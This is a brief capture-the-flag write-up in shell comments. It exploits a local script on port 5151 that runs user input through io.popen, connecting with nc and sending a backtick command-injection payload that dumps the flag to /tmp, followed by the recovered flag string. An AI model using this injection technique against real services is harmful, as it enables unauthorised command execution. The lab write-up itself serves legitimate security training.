# we find a script listening to port 5151
# it uses io:popen to execute a shell command
# the command doesn't sanitize user inputs

# connect to server
nc localhost 5151 # > Password:
# send evil command
'`getflag` > /tmp/oui ; echo lol'
# get flag
cat /tmp/oui # > fa6v5ateaw21peobuub8ipe6s
